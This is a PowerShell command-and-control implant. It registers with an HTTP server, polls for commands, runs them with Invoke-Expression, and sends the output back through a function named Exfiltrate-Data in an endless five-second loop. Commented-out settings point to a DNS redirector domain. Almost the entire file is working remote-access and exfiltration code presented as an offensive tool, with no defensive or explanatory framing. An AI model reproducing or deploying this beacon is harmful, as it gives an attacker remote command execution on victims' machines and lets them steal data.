#$dnsAddr = "127.0.0.1"
$httpAddr = "http://127.0.0.1:8088"
#$domain = "a.malgo-redirector.com"

$chunkLength = 1024
#$chunkLength = 80 - $domain.Length
#if ($chunkLength % 2 -ne 0) {
#    $chunkLength -= 1
#}

$sessionId = "d8524193-809d-4f36-b65c-9a48ead7258e"
$projectId = "6ed44c13-1a72-4652-936e-d6799a487736"

filter thx { ($_.ToCharArray() | % { "{0:X2}" -f [int]$_ }) -join "" }
filter chunks($c) { $t = $_; 0..[math]::floor($t.length / $c) | % { $t.substring($c * $_, [math]::min($c, $t.length - $c * $_)) } } 
filter dots($c) { ($_ -replace "([\w]{$c})", "`$1.").trim('.') } 

function Get-Blob {
    return -join ((65..90) + (97..122) | Get-Random -Count 4 | % { [char]$_ })
}

function Register-Session {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $sessionID,
        [Parameter()]
        [String]
        $projectID
    )
    Invoke-RestMethod -Uri "$httpAddr/$projectID/$sessionID" -Method PUT
}

function Get-CommandInfo {
    (Invoke-WebRequest -UseBasicParsing -Uri "$httpAddr/s/$sessionId" -Method GET).Content
}

function Get-CommandDetails {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $commandID
    )

    $currentOffset = 0
    $isFinished = $false
    $command = ""

    while (-not $isFinished) {
        [string]$stringOffset = $currentOffset
        $response = Invoke-RestMethod -Uri "$httpAddr/c/$commandID/$currentOffset" -Method GET

#        $response = $response -join ""
        # decode response from base64
        $response = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response))

        $response = $response | ConvertFrom-Json

        Write-Host "Response: $response"

        $data = $response.data
        $isFinished = $response.is_last_chunk
        Write-Host "Is Finished: $isFinished"
        $currentOffset += $data.Length
        Write-Host "Current Offset: $currentOffset"
        $command += $data
    }

    return $command
}

function Exfiltrate-Data {
    [CmdletBinding()]
    param (
        [Parameter()]
        [String]
        $commandId,
        [Parameter()]
        [String]
        $data
    )

    $dataToSend = $data | Out-String

    $result_length = $dataToSend.Length

    # send the length of the data
    Invoke-RestMethod -Uri "$httpAddr/c/$commandId/$result_length" -Method PATCH

    $offset = 0

    $dataToSend | chunks $chunkLength | % {
        $chunk = $_
        [string]$stringOffset = $offset
        $payload = ([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($chunk)))
        Write-Host "Payload: $payload"
        Invoke-WebRequest -UseBasicParsing -Uri "$httpAddr/c/$commandId/$stringOffset" -Method POST -Body "$payload"
        Write-Host "Sent chunk: $chunk"
        Write-Host "Offset: $offset"
        Write-Host "--------------------------------"
        $offset += $chunkLength
    }

}

Register-Session -sessionID $sessionId -projectID $projectId
while($true) {
    $cmd = Get-CommandInfo
    if ($cmd -eq "null" -or $cmd -eq "") {
        Write-Host "No command found"
    }
    else {
        $cmdInfo = $cmd | ConvertFrom-Json

        $command = Get-CommandDetails -commandID $cmdInfo.command_id
        Write-Host "Command: $command"

        $response = Invoke-Expression $command | Out-String
        Write-Host "Response: $response"

        Exfiltrate-Data -commandId $cmdInfo.command_id -data $response
    }

    Write-Host "Sleeping for 5 seconds"
    Start-Sleep -Seconds 5
}